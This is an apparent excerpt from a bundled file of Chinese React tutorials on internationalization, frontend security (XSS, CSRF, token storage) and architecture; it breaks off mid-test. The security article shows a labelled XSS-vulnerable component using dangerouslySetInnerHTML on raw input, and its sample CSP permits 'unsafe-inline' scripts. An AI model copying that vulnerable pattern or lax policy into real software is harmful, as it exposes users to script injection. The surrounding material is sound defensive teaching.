**react-intl - Airbnb 出品的国际化方案：**
- Airbnb 开发的 React 国际化解决方案，专注于格式化
- 基于 ICU 消息格式，支持复杂的复数和性别规则
- 提供 FormattedMessage、FormattedDate、FormattedNumber 等组件
- 支持 React 和 React Native，API 设计一致
- 适合需要复杂格式化的应用，如电商、金融类应用

\`\`\`typescript
// react-intl 配置示例
import { IntlProvider, FormattedMessage, FormattedNumber, FormattedDate } from 'react-intl';

const messages = {
  en: {
    greeting: 'Hello, {name}!',
    items: '{count, plural, one {# item} other {# items}}',
    income: '{gender, select, male {He earns} female {She earns} other {They earn}} {amount}',
  },
  zh: {
    greeting: '你好，{name}！',
    items: '{count} 个项目',
    income: '{gender, select, male {他赚} female {她赚} other {他们赚}} {amount}',
  },
};

function App() {
  const [locale, setLocale] = useState('en');
  
  return (
    <IntlProvider locale={locale} messages={messages[locale]}>
      <div>
        <FormattedMessage id="greeting" values={{ name: 'Alice' }} />
        <FormattedNumber value={1234.56} style="currency" currency="USD" />
        <FormattedDate value={new Date()} year="numeric" month="long" day="numeric" />
      </div>
    </IntlProvider>
  );
}
\`\`\`

**Format.js - 底层格式化工具集：**
- 一套国际化工具集，react-intl 的底层依赖
- 支持格式化日期、数字、货币、相对时间等
- 提供 ICU 消息格式的完整实现
- 可以独立使用，也可以与其他国际化库配合

### 实现策略

**消息管理最佳实践：**
- 集中管理翻译文件，使用 JSON 或 YAML 格式存储
- 按功能模块划分命名空间，避免单个文件过大
- 支持动态加载翻译文件，减少初始加载体积
- 使用翻译管理工具（如 Crowdin、Lokalise）协作翻译

\`\`\`typescript
// 翻译文件结构示例
// /locales/en/common.json
{
  "welcome": "Welcome to our app",
  "navigation": {
    "home": "Home",
    "about": "About",
    "contact": "Contact"
  },
  "errors": {
    "required": "This field is required",
    "invalidEmail": "Please enter a valid email address"
  }
}

// /locales/zh/common.json
{
  "welcome": "欢迎使用我们的应用",
  "navigation": {
    "home": "首页",
    "about": "关于我们",
    "contact": "联系我们"
  },
  "errors": {
    "required": "此字段为必填项",
    "invalidEmail": "请输入有效的电子邮件地址"
  }
}

// 组件中使用翻译
import { useTranslation } from 'react-i18next';

function Navigation() {
  const { t } = useTranslation('common');
  
  return (
    <nav>
      <Link to="/">{t('navigation.home')}</Link>
      <Link to="/about">{t('navigation.about')}</Link>
      <Link to="/contact">{t('navigation.contact')}</Link>
    </nav>
  );
}
\`\`\`

**语言检测策略：**
- 从 URL 参数检测（如 ?lang=zh），适合 SEO 和分享链接
- 从浏览器设置检测（navigator.language），提供默认语言
- 从用户偏好检测（localStorage/cookie），记住用户选择
- 优先级：URL 参数 > 用户偏好 > 浏览器设置 > 默认语言

\`\`\`typescript
// 语言切换组件
import { useTranslation } from 'react-i18next';

function LanguageSwitcher() {
  const { i18n } = useTranslation();
  
  const changeLanguage = (lng: string) => {
    i18n.changeLanguage(lng);
    // 保存用户偏好
    localStorage.setItem('preferredLanguage', lng);
    // 更新 URL 参数
    const url = new URL(window.location.href);
    url.searchParams.set('lang', lng);
    window.history.replaceState({}, '', url.toString());
  };
  
  return (
    <div className="language-switcher">
      <button 
        onClick={() => changeLanguage('en')}
        className={i18n.language === 'en' ? 'active' : ''}
      >
        English
      </button>
      <button 
        onClick={() => changeLanguage('zh')}
        className={i18n.language === 'zh' ? 'active' : ''}
      >
        中文
      </button>
    </div>
  );
}
\`\`\`

**文本提取与翻译工作流：**
- 使用 i18next-scanner 或 babel-plugin-react-intl 自动提取文本
- 支持批量翻译，导出为 XLIFF 或 CSV 格式
- 与翻译服务集成，自动化翻译流程
- 使用 CI/CD 检查翻译完整性

\`\`\`javascript
// i18next-scanner 配置
module.exports = {
  input: ['src/**/*.{js,jsx,ts,tsx}'],
  output: 'public/locales',
  options: {
    debug: true,
    sort: true,
    func: {
      list: ['t', 'i18n.t'],
      extensions: ['.js', '.jsx', '.ts', '.tsx'],
    },
    trans: {
      component: 'Trans',
      i18nKey: 'i18nKey',
      defaultsKey: 'defaults',
      extensions: ['.js', '.jsx', '.ts', '.tsx'],
    },
    lngs: ['en', 'zh', 'ja'],
    ns: ['common', 'home'],
    defaultLng: 'en',
    defaultNs: 'common',
  },
};
\`\`\`

### 性能优化

**懒加载翻译文件：**
- 按需加载翻译文件，减少初始加载体积
- 使用命名空间分隔翻译，按页面或功能加载
- 配合 React Suspense 提供加载状态

\`\`\`typescript
// 懒加载翻译配置
i18n
  .use(HttpBackend)
  .use(initReactI18next)
  .init({
    backend: {
      loadPath: '/locales/{{lng}}/{{ns}}.json',
    },
    // 只加载需要的命名空间
    partialBundledLanguages: true,
    // 预加载常用语言
    preload: ['en'],
  });

// 动态加载命名空间
function AdminPanel() {
  const { t } = useTranslation('admin', { useSuspense: true });
  return <div>{t('title')}</div>;
}

// 使用 Suspense 处理加载状态
function App() {
  return (
    <Suspense fallback={<Loading />}>
      <AdminPanel />
    </Suspense>
  );
}
\`\`\`

**缓存翻译文件：**
- 使用 Service Worker 缓存翻译文件
- 利用浏览器 HTTP 缓存
- 使用 localStorage 缓存已加载的翻译

\`\`\`typescript
// 使用 localStorage 缓存
const localStorageBackend = {
  type: 'localStorage',
  prefix: 'i18next_',
  expirationTime: 7 * 24 * 60 * 60 * 1000, // 7天
};

i18n.use(initReactI18next).init({
  backend: {
    backends: [
      localStorageBackend, // 优先从缓存读取
      HttpBackend, // 缓存未命中时从服务器加载
    ],
  },
});
\`\`\`

**优化渲染性能：**
- 避免不必要的重新渲染，使用 memo 包裹组件
- 使用 useMemo 缓存翻译结果
- 避免在渲染中动态生成翻译 key

\`\`\`typescript
// 优化前：每次渲染都创建新对象
function UserCard({ user }) {
  const { t } = useTranslation();
  return (
    <div>
      <h2>{t('user.greeting', { name: user.name })}</h2>
      <p>{t('user.role', { role: user.role })}</p>
    </div>
  );
}

// 优化后：使用 memo 和 useMemo
const UserCard = memo(function UserCard({ user }) {
  const { t } = useTranslation();
  const values = useMemo(() => ({ name: user.name }), [user.name]);
  return (
    <div>
      <h2>{t('user.greeting', values)}</h2>
      <p>{t('user.role', { role: user.role })}</p>
    </div>
  );
});
\`\`\`

### 最佳实践

**组件化翻译：**
- 创建国际化组件封装翻译逻辑
- 提高代码复用性，统一翻译风格
- 便于后期维护和修改

\`\`\`typescript
// 封装翻译组件
interface TranslatedTextProps {
  id: string;
  values?: Record<string, string | number>;
  defaultValue?: string;
}

const TranslatedText: React.FC<TranslatedTextProps> = ({ 
  id, 
  values, 
  defaultValue 
}) => {
  const { t } = useTranslation();
  return <>{t(id, values, { defaultValue })}</>;
};

// 使用示例
<TranslatedText id="welcome.message" values={{ name: 'Alice' }} />
\`\`\`

**占位符和插值：**
- 使用占位符处理动态内容，避免字符串拼接
- 支持复数形式，不同语言复数规则不同
- 支持性别变化，某些语言需要根据性别调整

\`\`\`typescript
// 插值示例
// en.json
{
  "greeting": "Hello, {{name}}!",
  "items": "{{count}} item",
  "items_plural": "{{count}} items"
}

// zh.json
{
  "greeting": "你好，{{name}}！",
  "items": "{{count}} 个项目"
}

// 使用
t('greeting', { name: 'Alice' }) // "Hello, Alice!" / "你好，Alice！"
t('items', { count: 1 }) // "1 item" / "1 个项目"
t('items', { count: 5 }) // "5 items" / "5 个项目"
\`\`\`

**日期和时间本地化：**
- 使用本地化的日期和时间格式
- 考虑时区问题，显示用户本地时间
- 使用 Intl.DateTimeFormat 或库处理

\`\`\`typescript
// 使用 Intl API 格式化日期
const formatDate = (date: Date, locale: string) => {
  return new Intl.DateTimeFormat(locale, {
    year: 'numeric',
    month: 'long',
    day: 'numeric',
    weekday: 'long',
  }).format(date);
};

// en: "Saturday, March 15, 2026"
// zh: "2026年3月15日星期六"

// 使用 react-intl
import { FormattedDate, FormattedRelativeTime } from 'react-intl';

<FormattedDate 
  value={new Date()} 
  year="numeric" 
  month="long" 
  day="numeric" 
/>

<FormattedRelativeTime 
  value={-5} 
  unit="minute" 
  numeric="auto" 
/>
// "5 minutes ago" / "5分钟前"
\`\`\`

**数字和货币本地化：**
- 使用本地化的数字格式
- 正确处理货币符号和位置
- 使用 Intl.NumberFormat 或库处理

\`\`\`typescript
// 使用 Intl API 格式化数字
const formatNumber = (number: number, locale: string) => {
  return new Intl.NumberFormat(locale).format(number);
};

// en: "1,234,567.89"
// zh: "1,234,567.89"
// de: "1.234.567,89"

// 格式化货币
const formatCurrency = (amount: number, locale: string, currency: string) => {
  return new Intl.NumberFormat(locale, {
    style: 'currency',
    currency: currency,
  }).format(amount);
};

// en-US, USD: "$1,234.56"
// zh-CN, CNY: "\xa51,234.56"
// ja-JP, JPY: "￥1,235"
\`\`\`

**RTL（从右到左）布局支持：**
- 测试 RTL 布局，如阿拉伯语、希伯来语
- 使用 CSS 逻辑属性（start/end 代替 left/right）
- 提供布局方向切换功能

\`\`\`typescript
// RTL 支持
function App() {
  const { i18n } = useTranslation();
  const isRTL = ['ar', 'he', 'fa'].includes(i18n.language);
  
  return (
    <div dir={isRTL ? 'rtl' : 'ltr'} className={isRTL ? 'rtl' : 'ltr'}>
      {/* 内容 */}
    </div>
  );
}

// CSS 逻辑属性
.card {
  padding-inline-start: 16px; /* LTR: padding-left, RTL: padding-right */
  margin-inline-end: 8px;
  border-start-start-radius: 8px; /* LTR: top-left, RTL: top-right */
}
\`\`\`

**测试国际化：**
- 测试不同语言的渲染效果
- 测试文本长度变化对布局的影响
- 测试 RTL 布局
- 测试日期、数字、货币格式化

\`\`\`typescript
// 国际化测试示例
import { render, screen } from '@testing-library/react';
import { I18nextProvider } from 'react-i18next';
import i18n from './i18n';

describe('Navigation', () => {
  it('renders in English', () => {
    i18n.changeLanguage('en');
    render(
      <I18nextProvider i18n={i18n}>
        <Navigation />
      </I18nextProvider>
    );
    expect(screen.getByText('Home')).toBeInTheDocument();
  });

  it('renders in Chinese', () => {
    i18n.changeLanguage('zh');
    render(
      <I18nextProvider i18n={i18n}>
        <Navigation />
      </I18nextProvider>
    );
    expect(screen.getByText('首页')).toBeInTheDocument();
  });
});
\`\`\``,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"react-security",title:"React 应用安全最佳实践",category:"react",difficulty:"medium",tags:["React","安全","XSS","CSRF"],content:`## React 应用安全最佳实践

安全是 React 应用开发的重要考虑因素，前端安全不仅关乎用户数据保护，也直接影响应用的可靠性和用户信任。React 在设计上已经考虑了许多安全问题，但开发者仍需了解常见的安全威胁和防护措施，构建安全可靠的应用。

### XSS 防护详解

**跨站脚本攻击 (XSS) 原理：**
XSS 攻击是指攻击者将恶意脚本注入到网页中，当其他用户浏览该网页时，恶意脚本会在用户浏览器中执行。XSS 攻击可以窃取用户的 Cookie、Session Token、敏感数据，甚至可以重定向用户到恶意网站、执行未授权操作。XSS 攻击分为反射型（恶意脚本来自 URL 参数）、存储型（恶意脚本存储在服务器数据库）、DOM 型（恶意脚本通过 DOM 操作注入）三种类型。

**React 内置防护机制：**
React 默认会对渲染内容进行转义，将特殊字符转换为 HTML 实体，防止脚本注入。例如，<script> 会被转义为 &lt;script&gt;，从而阻止脚本执行。这是 React 提供的第一道防线，但开发者需要避免绕过这个机制。

**dangerouslySetInnerHTML 的风险：**
dangerouslySetInnerHTML 是 React 提供的用于插入原始 HTML 的 API，它会绕过 React 的转义机制。如果插入的 HTML 包含用户输入，就可能导致 XSS 攻击。使用 dangerouslySetInnerHTML 时必须确保内容来源可信，或使用 DOMPurify 等库进行清理。

### 代码示例

\`\`\`javascript
// ❌ XSS 漏洞示例
function UnsafeComponent({ userInput }) {
  return (
    <div dangerouslySetInnerHTML={{ __html: userInput }} />
  );
}

// ✅ 安全的 HTML 渲染
import DOMPurify from 'dompurify';

function SafeComponent({ userInput }) {
  const sanitizedHTML = DOMPurify.sanitize(userInput, {
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href', 'title']
  });
  
  return (
    <div dangerouslySetInnerHTML={{ __html: sanitizedHTML }} />
  );
}

// ✅ React 默认转义（安全）
function SafeDefault({ userInput }) {
  // React 会自动转义 userInput
  return <div>{userInput}</div>;
}

// URL 安全处理
function SafeLink({ url, children }) {
  // 验证 URL 协议
  const isSafeURL = (url) => {
    try {
      const parsedURL = new URL(url, window.location.origin);
      return ['http:', 'https:', 'mailto:'].includes(parsedURL.protocol);
    } catch {
      return false;
    }
  };
  
  const safeURL = isSafeURL(url) ? url : '#';
  
  return (
    <a 
      href={safeURL} 
      target="_blank" 
      rel="noopener noreferrer"
    >
      {children}
    </a>
  );
}

// CSP 配置示例（在 HTML 中）
// <meta http-equiv="Content-Security-Policy" 
//       content="default-src 'self'; 
//                script-src 'self' 'unsafe-inline' https://trusted.cdn.com; 
//                style-src 'self' 'unsafe-inline'; 
//                img-src 'self' data: https:; 
//                connect-src 'self' https://api.example.com;">

// CSRF 防护示例
function SecureForm() {
  const [formData, setFormData] = useState({});
  
  const handleSubmit = async (e) => {
    e.preventDefault();
    
    // 获取 CSRF Token
    const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;
    
    try {
      const response = await fetch('/api/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': csrfToken
        },
        credentials: 'include', // 发送 Cookie
        body: JSON.stringify(formData)
      });
      
      if (!response.ok) throw new Error('Submit failed');
      
      const result = await response.json();
      console.log('Success:', result);
    } catch (error) {
      console.error('Error:', error);
    }
  };
  
  return (
    <form onSubmit={handleSubmit}>
      <input 
        type="text" 
        onChange={(e) => setFormData({ ...formData, name: e.target.value })}
      />
      <button type="submit">Submit</button>
    </form>
  );
}

// 敏感数据处理
function SecureAuth() {
  // ❌ 不安全：存储敏感数据
  // localStorage.setItem('token', sensitiveToken);
  
  // ✅ 安全：使用 HttpOnly Cookie（服务器设置）
  // 服务器端设置：Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Strict
  
  // ✅ 安全：使用内存存储（页面刷新后需要重新获取）
  let token = null;
  
  const login = async (credentials) => {
    const response = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(credentials),
      credentials: 'include'
    });
    
    if (response.ok) {
      const data = await response.json();
      token = data.token; // 存储在内存中
    }
  };
  
  const logout = () => {
    token = null; // 清除内存中的 token
    fetch('/api/logout', { method: 'POST', credentials: 'include' });
  };
  
  return <LoginForm onLogin={login} onLogout={logout} />;
}

// 环境变量安全使用
// ❌ 不安全：暴露敏感信息
// const API_KEY = process.env.REACT_APP_SECRET_KEY; // 会被打包到客户端代码

// ✅ 安全：敏感操作在服务器端进行
// 客户端调用服务器 API，服务器使用密钥
async function fetchData() {
  const response = await fetch('/api/data', {
    headers: {
      'Authorization': \`Bearer \${getToken()}\`
    }
  });
  return response.json();
}

// 依赖安全检查脚本
// package.json
// {
//   "scripts": {
//     "audit": "npm audit",
//     "audit:fix": "npm audit fix"
//   }
// }

// 输入验证和清理
function validateInput(input, type) {
  const validators = {
    email: (value) => /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/.test(value),
    phone: (value) => /^1[3-9]\\d{9}$/.test(value),
    username: (value) => /^[a-zA-Z0-9_]{3,20}$/.test(value),
    url: (value) => {
      try {
        new URL(value);
        return true;
      } catch {
        return false;
      }
    }
  };
  
  const sanitizer = {
    text: (value) => DOMPurify.sanitize(value),
    number: (value) => parseInt(value, 10) || 0,
    alphanumeric: (value) => value.replace(/[^a-zA-Z0-9]/g, '')
  };
  
  return {
    isValid: validators[type]?.(input) ?? true,
    sanitized: sanitizer[type]?.(input) ?? input
  };
}

// 安全的错误处理
function SecureErrorBoundary({ children }) {
  const [hasError, setHasError] = useState(false);
  
  useEffect(() => {
    const handleError = (event) => {
      // 记录错误到服务器，但不暴露敏感信息
      logError({
        message: event.message,
        stack: event.error?.stack,
        timestamp: new Date().toISOString()
      });
      
      setHasError(true);
      event.preventDefault();
    };
    
    window.addEventListener('error', handleError);
    window.addEventListener('unhandledrejection', handleError);
    
    return () => {
      window.removeEventListener('error', handleError);
      window.removeEventListener('unhandledrejection', handleError);
    };
  }, []);
  
  if (hasError) {
    return <div>Something went wrong. Please try again.</div>;
  }
  
  return children;
}
\`\`\`

### CSRF 防护详解

**跨站请求伪造 (CSRF) 原理：**
CSRF 攻击利用用户已认证的身份，诱导用户在不知情的情况下向目标网站发送恶意请求。攻击者可以伪造转账、修改密码、删除数据等操作。CSRF 攻击成功的关键是浏览器会自动携带目标网站的 Cookie。

**CSRF 防护策略：**
使用 CSRF Token 是最常用的防护方法，服务器生成随机 Token，嵌入到表单或请求头中，服务器验证 Token 有效性。验证 Origin 和 Referer 头可以检测跨站请求。使用 SameSite Cookie 属性可以限制 Cookie 在跨站请求中的发送。实现正确的 CORS 策略可以控制跨域请求的访问权限。

### 其他安全最佳实践

**敏感数据保护：**
不在前端存储敏感数据，如密码、API 密钥、私钥等。使用 HttpOnly、Secure、SameSite 属性的 Cookie 存储认证信息。使用 HTTPS 加密传输数据，防止中间人攻击。对敏感数据进行加密存储，使用 Web Crypto API 进行客户端加密。

**依赖安全管理：**
定期运行 npm audit 检查依赖漏洞，及时更新有漏洞的依赖包。配置 dependabot 或 Renovate 自动更新依赖。使用 Snyk 等工具进行持续的安全监控。锁定依赖版本，使用 package-lock.json 或 yarn.lock 确保依赖一致性。

**安全开发流程：**
建立安全代码审查机制，使用静态代码分析工具（如 ESLint 安全插件）检测潜在问题。进行渗透测试和安全扫描，模拟攻击场景验证防护措施。培训开发团队的安全意识，建立安全漏洞响应机制。`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"react-architecture",title:"React 应用架构设计最佳实践",category:"react",difficulty:"hard",tags:["React","架构","设计模式"," scalability"],content:`## React 应用架构设计最佳实践

良好的架构是 React 应用可维护性和可扩展性的关键。一个优秀的 React 应用架构应该遵循关注点分离、单一职责、高内聚低耦合等原则，同时考虑团队协作、代码可维护性和长期演进能力。

### 文件夹结构

**按功能组织（Feature-based）：**
- 按业务功能划分文件夹，每个功能模块独立管理
- 每个功能包含相关的组件、hooks、utils、types、styles
- 提高代码的内聚性，便于功能开发和维护
- 适合中大型应用，支持团队并行开发

\`\`\`
src/
├── features/
│   ├── auth/
│   │   ├── components/
│   │   │   ├── LoginForm.tsx
│   │   │   └── RegisterForm.tsx
│   │   ├── hooks/
│   │   │   └── useAuth.ts
│   │   ├── api/
│   │   │   └── authApi.ts
│   │   ├── types/
│   │   │   └── auth.types.ts
│   │   └── index.ts
│   ├── dashboard/
│   └── profile/
├── shared/
│   ├── components/
│   ├── hooks/
│   └── utils/
└── App.tsx
\`\`\`

**按类型组织（Type-based）：**
- 按组件、hooks、utils 等类型划分
- 适合小型应用和快速原型开发
- 易于找到特定类型的文件
- 缺点是功能模块分散，不利于维护

\`\`\`
src/
├── components/
│   ├── Button.tsx
│   ├── Modal.tsx
│   └── Header.tsx
├── hooks/
│   ├── useAuth.ts
│   └── useApi.ts
├── utils/
│   └── helpers.ts
└── App.tsx
\`\`\`

**混合组织（Hybrid）：**
- 结合功能和类型组织，取两者之长
- 核心业务功能按功能组织，提高内聚性
- 通用功能按类型组织，便于复用
- 是大多数中大型项目的最佳选择

### 组件设计

**组件拆分原则：**
- 遵循单一职责原则，每个组件只做一件事
- 拆分为原子组件（Atoms）、分子组件（Molecules）、组织组件（Organisms）、模板组件（Templates）、页面组件（Pages）
- 原子组件是最基础的UI元素，如Button、Input、Icon
- 分子组件由原子组件组合而成，如SearchForm、Card
- 组织组件是复杂的UI区块，如Header、Sidebar
- 合理使用组合而非继承，React推荐组合模式

\`\`\`typescript
// 原子组件：Button
interface ButtonProps {
  variant?: 'primary' | 'secondary' | 'danger';
  size?: 'sm' | 'md' | 'lg';
  children: React.ReactNode;
  onClick?: () => void;
}

const Button: React.FC<ButtonProps> = ({ 
  variant = 'primary', 
  size = 'md', 
  children, 
  onClick 
}) => {
  return (
    <button 
      className={\`btn btn-\${variant} btn-\${size}\`}
      onClick={onClick}
    >
      {children}
    </button>
  );
};

// 分子组件：SearchForm
const SearchForm: React.FC<{ onSearch: (query: string) => void }> = ({ onSearch }) => {
  const [query, setQuery] = useState('');
  
  return (
    <form onSubmit={(e) => { e.preventDefault(); onSearch(query); }}>
      <Input 
        value={query} 
        onChange={(e) => setQuery(e.target.value)} 
        placeholder="Search..."
      />
      <Button type="submit">Search</Button>
    </form>
  );
};

// 组织组件：Header
const Header: React.FC = () => {
  return (
    <header className="header">
      <Logo />
      <Navigation />
      <SearchForm onSearch={handleSearch} />
      <UserMenu />
    </header>
  );
};
\`\`\`

**组件通信策略：**
- 父子组件：props 和回调函数，这是最基本也是最推荐的通信方式
- 跨组件：Context API 或状态管理库，避免props drilling问题
- 全局通信：事件总线或全局状态管理，谨慎使用避免过度复杂化

\`\`\`typescript
// 父子组件通信
interface ChildProps {
  data: string;
  onUpdate: (newValue: string) => void;
}

const Child: React.FC<ChildProps> = ({ data, onUpdate }) => {
  return (
    <div>
      <span>{data}</span>
      <button onClick={() => onUpdate('new value')}>Update</button>
    </div>
  );
};

const Parent: React.FC = () => {
  const [value, setValue] = useState('initial');
  return <Child data={value} onUpdate={setValue} />;
};

// Context 跨组件通信
const ThemeContext = createContext<{ theme: string; setTheme: (t: string) => void }>({
  theme: 'light',
  setTheme: () => {},
});

const ThemedButton: React.FC = () => {
  const { theme, setTheme } = useContext(ThemeContext);
  return (
    <button 
      className={\`btn btn-\${theme}\`}
      onClick={() => setTheme(theme === 'light' ? 'dark' : 'light')}
    >
      Toggle Theme
    </button>
  );
};
\`\`\`

**组件复用模式：**
- 创建可复用的 UI 组件库，统一设计语言
- 使用 props 控制组件行为，提供灵活的配置能力
- 提供合理的默认值，降低使用门槛
- 使用 render props 和 HOC 模式实现高级复用

\`\`\`typescript
// Render Props 模式
interface DataFetcherProps {
  url: string;
  children: (data: any, loading: boolean, error: Error | null) => React.ReactNode;
}

const DataFetcher: React.FC<DataFetcherProps> = ({ url, children }) => {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<Error | null>(null);

  useEffect(() => {
    fetch(url)
      .then(res => res.json())
      .then(setData)
      .catch(setError)
      .finally(() => setLoading(false));
  }, [url]);

  return <>{children(data, loading, error)}</>;
};

// 使用示例
<DataFetcher url="/api/users">
  {(users, loading, error) => {
    if (loading) return <Spinner />;
    if (error) return <Error message={error.message} />;
    return <UserList users={users} />;
  }}
</DataFetcher>

// HOC 模式
function withLoading<P>(WrappedComponent: React.ComponentType<P>) {
  return function WithLoadingComponent({ isLoading, ...props }: P & { isLoading: boolean }) {
    if (isLoading) return <Spinner />;
    return <WrappedComponent {...(props as P)} />;
  };
}
\`\`\`

### 状态管理

**状态分层策略：**
- 组件内部状态（Local State）：使用 useState 管理，适用于组件私有的UI状态
- 跨组件状态（Shared State）：使用 Context API，适用于简单的跨组件共享
- 全局状态（Global State）：使用 Redux Toolkit、Zustand 等状态管理库
- 服务器状态（Server State）：使用 React Query 或 SWR，自动处理缓存和同步

\`\`\`typescript
// 组件内部状态
const Counter: React.FC = () => {
  const [count, setCount] = useState(0);
  return (
    <div>
      <span>{count}</span>
      <button onClick={() => setCount(c => c + 1)}>+1</button>
    </div>
  );
};

// Context 跨组件状态
interface User {
  id: string;
  name: string;
  email: string;
}

interface UserContextType {
  user: User | null;
  login: (user: User) => void;
  logout: () => void;
}

const UserContext = createContext<UserContextType | null>(null);

export const UserProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [user, setUser] = useState<User | null>(null);
  
  const login = (user: User) => setUser(user);
  const logout = () => setUser(null);
  
  return (
    <UserContext.Provider value={{ user, login, logout }}>
      {children}
    </UserContext.Provider>
  );
};

export const useUser = () => {
  const context = useContext(UserContext);
  if (!context) throw new Error('useUser must be used within UserProvider');
  return context;
};

// Zustand 全局状态
import { create } from 'zustand';

interface AppState {
  count: number;
  increment: () => void;
  decrement: () => void;
}

const useStore = create<AppState>((set) => ({
  count: 0,
  increment: () => set((state) => ({ count: state.count + 1 })),
  decrement: () => set((state) => ({ count: state.count - 1 })),
}));

// React Query 服务器状态
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';

const fetchUsers = async (): Promise<User[]> => {
  const res = await fetch('/api/users');
  return res.json();
};

const UserList: React.FC = () => {
  const { data, isLoading, error } = useQuery({
    queryKey: ['users'],
    queryFn: fetchUsers,
  });

  if (isLoading) return <Spinner />;
  if (error) return <Error />;
  return <ul>{data?.map(user => <li key={user.id}>{user.name}</li>)}</ul>;
};
\`\`\`

**状态设计原则：**
- 保持状态最小化，避免冗余和派生状态
- 状态就近原则，能放在局部就不放在全局
- 避免状态冗余，使用 useMemo 计算派生状态
- 状态更新逻辑清晰，使用不可变数据

\`\`\`typescript
// ❌ 错误：冗余状态
const [firstName, setFirstName] = useState('');
const [lastName, setLastName] = useState('');
const [fullName, setFullName] = useState(''); // 冗余！

// ✅ 正确：最小化状态 + 派生值
const [firstName, setFirstName] = useState('');
const [lastName, setLastName] = useState('');
const fullName = \`\${firstName} \${lastName}\`; // 派生值

// ✅ 使用 useMemo 优化派生状态
const expensiveValue = useMemo(() => {
  return heavyCalculation(rawData);
}, [rawData]);
\`\`\`

### 数据流

**单向数据流原则：**
- 数据从父组件流向子组件，形成清晰的数据流向
- 状态更新通过回调函数向上传递，保持数据流可预测
- 避免双向绑定带来的复杂性，调试更加容易

\`\`\`typescript
// 单向数据流示例
interface TodoListProps {
  todos: Todo[];
  onToggle: (id: string) => void;
  onDelete: (id: string) => void;
}

const TodoList: React.FC<TodoListProps> = ({ todos, onToggle, onDelete }) => {
  return (
    <ul>
      {todos.map(todo => (
        <TodoItem 
          key={todo.id}
          todo={todo}
          onToggle={onToggle}
          onDelete={onDelete}
        />
      ))}
    </ul>
  );
};

// 父组件管理状态，子组件通过回调通知变化
const TodoApp: React.FC = () => {
  const [todos, setTodos] = useState<Todo[]>([]);
  
  const handleToggle = (id: string) => {
    setTodos(todos.map(t => 
      t.id === id ? { ...t, completed: !t.completed } : t
    ));
  };
  
  return <TodoList todos={todos} onToggle={handleToggle} />;
};
\`\`\`

**数据获取策略：**
- 使用 React Query 或 SWR 管理异步数据，自动处理缓存、重试、失效
- 处理加载和错误状态，提供良好的用户体验
- 支持缓存和失效策略，减少不必要的网络请求

\`\`\`typescript
// React Query 数据获取
const useUserPosts = (userId: string) => {
  return useQuery({
    queryKey: ['posts', userId],
    queryFn: () => fetchUserPosts(userId),
    staleTime: 5 * 60 * 1000, // 5分钟内数据视为新鲜
    gcTime: 10 * 60 * 1000, // 10分钟后清除缓存
    refetchOnWindowFocus: true, // 窗口聚焦时重新获取
  });
};

// 乐观更新
const useUpdatePost = () => {
  const queryClient = useQueryClient();
  
  return useMutation({
    mutationFn: updatePost,
    onMutate: async (newPost) => {
      // 取消正在进行的查询
      await queryClient.cancelQueries({ queryKey: ['posts'] });
      
      // 保存旧数据
      const previousPosts = queryClient.getQueryData(['posts']);
      
      // 乐观更新
      queryClient.setQueryData(['posts'], (old: Post[]) => 
        old.map(p => p.id === newPost.id ? newPost : p)
      );
      
      return { previousPosts };
    },
    onError: (err, newPost, context) => {
      // 回滚
      queryClient.setQueryData(['posts'], context.previousPosts);
    },
    onSettled: () => {
      queryClient.invalidateQueries({ queryKey: ['posts'] });
    },
  });
};
\`\`\`

### 最佳实践

**代码规范与质量：**
- 使用 ESLint 和 Prettier 保持代码风格一致
- 遵循一致的命名规范：组件用 PascalCase，hooks 用 use 前缀
- 编写清晰的注释和文档，使用 JSDoc 标注复杂逻辑
- 使用 TypeScript 增强类型安全

\`\`\`typescript
// ESLint 配置示例
// .eslintrc.js
module.exports = {
  extends: [
    'eslint:recommended',
    'plugin:react/recommended',
    'plugin:react-hooks/recommended',
    'plugin:@typescript-eslint/recommended',
    'prettier',
  ],
  rules: {
    'react/react-in-jsx-scope': 'off',
    'react-hooks/rules-of-hooks': 'error',
    'react-hooks/exhaustive-deps': 'warn',
    '@typescript-eslint/no-unused-vars': ['error', { argsIgnorePattern: '^_' }],
  },
};

// Prettier 配置示例
// .prettierrc
{
  "semi": true,
  "singleQuote": true,
  "tabWidth": 2,
  "trailingComma": "es5",
  "printWidth": 100
}
\`\`\`

**文档与知识共享：**
- 组件 API 文档：使用 Storybook 展示组件用法
- 架构设计文档：记录技术决策和设计思路
- 开发指南：包含编码规范、Git 工作流、发布流程

\`\`\`typescript
// 组件文档示例
/**
 * Button 组件 - 基础按钮组件
 * 
 * @example
 * // 基础用法
 * <Button onClick={handleClick}>Click me</Button>
 * 
 * // 不同变体
 * <Button variant="primary">Primary</Button>
 * <Button variant="secondary">Secondary</Button>
 * <Button variant="danger">Danger</Button>
 * 
 * // 不同尺寸
 * <Button size="sm">Small</Button>
 * <Button size="md">Medium</Button>
 * <Button size="lg">Large</Button>
 */
interface ButtonProps {
  /** 按钮变体样式 */
  variant?: 'primary' | 'secondary' | 'danger';
  /** 按钮尺寸 */
  size?: 'sm' | 'md' | 'lg';
  /** 点击事件处理 */
  onClick?: () => void;
  /** 子元素 */
  children: React.ReactNode;
}
\`\`\`

**测试策略：**
- 单元测试：测试独立组件和工具函数
- 集成测试：测试组件交互和数据流
- 端到端测试：测试完整用户流程

\`\`\`typescript
// 组件单元测试示例
import { render, screen, fireEvent } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { LoginForm } from './LoginForm';

describe('LoginForm', () => {
  it('renders email and password inputs', () => {
    render(<LoginForm onSubmit={jest.fn()} />);
    expect(screen.getByLabelText(/email/i)).toBeInTheDocument();
    expect(screen.getByLabelText(/password/i)).toBeInTheDocument();
  });

  it('calls onSubmit with form data', async () => {
    const handleSubmit = jest.fn();
    render(<LoginForm onSubmit={handleSubmit} />);
    
    await userEvent.type(screen.getByLabelText(/email/i), 'test@example.com');
